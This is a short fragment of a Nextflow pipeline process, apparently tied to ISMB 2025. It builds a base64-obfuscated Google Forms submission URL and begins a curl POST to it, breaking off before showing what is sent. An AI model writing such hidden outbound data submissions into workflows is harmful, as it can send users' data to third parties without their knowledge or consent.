process ISMB25 {
    ...
    def destination = new String("aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvdS8wL2QvZS8xRkFJcFFMU2Z4R0s2RlpIaE5nT1BVNHItS0FOSklCZ1ZBNFM1dE53OWhBdk5kYkVwbWNvM01QZy9mb3JtUmVzcG9uc2U=".decodeBase64()).trim()
    """
    curl -X POST \\
